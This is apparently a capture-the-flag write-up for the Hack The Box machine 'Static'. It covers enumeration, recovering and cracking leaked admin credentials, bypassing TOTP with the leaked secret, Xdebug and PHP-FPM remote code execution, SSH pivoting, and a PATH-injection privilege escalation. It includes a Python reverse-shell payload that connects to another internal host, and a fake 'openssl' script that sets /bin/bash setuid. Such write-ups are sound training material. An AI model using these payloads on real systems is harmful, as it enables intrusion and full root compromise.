## Enumeration

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 (RSA)
|   256 ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b (ECDSA)
|_  256 2d:43:bc:4e:b3:33:c9:82:4e:de:b6:5e:10:ca:a7:c5 (ED25519)
2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:a4:5c:e3:a9:05:54:b1:1c:ae:1b:b7:61:ac:76:d6 (RSA)
|   256 c9:58:53:93:b3:90:9e:a0:08:aa:48:be:5e:c4:0a:94 (ECDSA)
|_  256 c7:07:2b:07:43:4f:ab:c8:da:57:7f:ea:b5:50:21:bd (ED25519)
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 2 disallowed entries 
|_/vpn/ /.ftp_uploads/
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web

It's a blank page. Let's check the entries from robots.txt. The `/vpn/` is a login page and `/.ftp_uploads/` is a directory index where two files exist `db.sql.gz` and `warning.txt`. The txt file contains:

```text
Binary files are being corrupted during transfer!!! Check if are recoverable.
```

This suggests to look for a fix up tool for the corrupted gz file and the one that worked I found [here](https://raw.githubusercontent.com/yonjar/fixgz/master/fixgz.cpp)

compile the cpp file with `g++ db.sql.gz fixed.gz` and then extract `gzip -d fixed.gz`.
What we end up getting is a file with the following contents:

```text
CREATE DATABASE static;
USE static;
CREATE TABLE users ( id smallint unsigned not null auto_increment, username varchar(20) not null, password varchar(40) not null, totp varchar(16) not null, primary key (id) ); 
INSERT INTO users ( id, username, password, totp ) VALUES ( null, 'admin', 'd033e22ae348aeb5660fc2140aec35850c4da997', 'orxxi4c7orxwwzlo' );
```

Let's crack the hash with john. The password is: admin.

Let's login to the login panel. After the first login we are prompted to a two-factor authentication panel requesting the OTP. We have the secret. We can use a this [website](https://totp.app/) to create an OTP.

Now we are greeted with a Internal IT Support portal. We can see the listed web servers and their status. With typing the server into the input field we get the corresponding ovpn file. We try "web" with address "172.2.0.10". Note that it'll connect after you add the domain to /etc/hosts. We can see that the domain is "vpn.static.htb" by opening the file.

Let's connect `openvpn web.ovpn`. When we try to browse the web the browser is left in loading state. If we check our interfaces (ifconfig) we notice that the new interface tun9 has an ip of "172.2.0.9". To vist 172.2.0.10 we need to add it to our route with `ip route add 128.2.0.0/24 dev tun9`. Now we succesfully can navigate to the web which is a directory index with two files a info.php and a vpn folder.

Displaying the php info page we see information disclosed about the program running Zend engine v3.2.0 and Xdebug v2.6.0. Searching for exploits we find a metaslpoit module for xdebug `exploit/unix/http/xdebug_unauth_exec`. We make use of it and gain shell to the filesystem.

## Pivoting

After an exhaustive for weak points on the system we note that we're connected to another interface eth1 with ip 192.168.254.2. If we recollect from a previous discovery we've found multiple networks and one of them pki (192.168.254.2) is in the same network on eth1. 

What we preferably want is web access via port forwarding:

```bash
ssh -L 8000:192.168.254.3:80 www-data@10.10.10.246 -p 2222 -i id_rsa
```

Then we can access the web by visiting `http://localhost:8000/` and we get a text:
```text
batch mode: /usr/bin/ersatool create|print|revoke CN
```
Let's get more info via the response header using curl:

```bash
curl localhost:8000 -I
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 07 Dec 2021 18:46:02 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP-FPM/7.1
```

Here's what's on the web for [vulnerabilities](https://medium.com/@knownsec404team/php-fpm-remote-code-execution-vulnerability-cve-2019-11043-analysis-35fd605dd2dc)

Running the to the forwarded port didn't work so we'll need to upload the exploit and run it on the compromished system. 

```bash
scp -P 2222 -i id_rsa exploit.py www-data@10.10.10.246:/tmp/exploit.py
```
Also upload a static netcat and the following script to make the get request and trigger the shell via RCE:

```python
import requests
 
payload = 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.254.2",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\''
 
r = requests.get("http://192.168.254.3/index.php?a="+payload)
print(r.text)
```

Open two ssh sessions and set-up a listener on one and on the other run the script 2-3 times until you get the callback.

Now that we have a shell as "pki" let's search for the ersatool. It's a binary run by root and after playing with it we see that it creates ovpn files:

If we search for the source code we find it, the program it's written in c:
```bash
find / -name ersatool.* 2>/dev/null
# /usr/src/ersatool.c 
```

Now we'll monitor the lib calls the program makes to exploit calls to relative paths.
Upload `pspy64` to the remote server. It'll require to open two ssh connections: one to run the binary and one to run pspy.

Capturing the lib calls we find that "openssl" is not using a absolute path, here are some of the lines:

```bash
2021/06/25 02:46:35 CMD: UID=0    PID=1965   | openssl version
2021/06/25 02:46:35 CMD: UID=0    PID=1973   | openssl rand -hex -out /opt/easyrsa/pki/serial 16
[REDACTED]
```

Now we'll use path injection to make the binary call our malicious openssl. Navigate to /tmp and create the openssl file:

```bash
#!/bin/bash
chmod u+s /bin/bash
```

Give execute permissions to openssl and export PATH. Run ersatool, create a random ovpn, exit and run /bin/bash -p to become root!

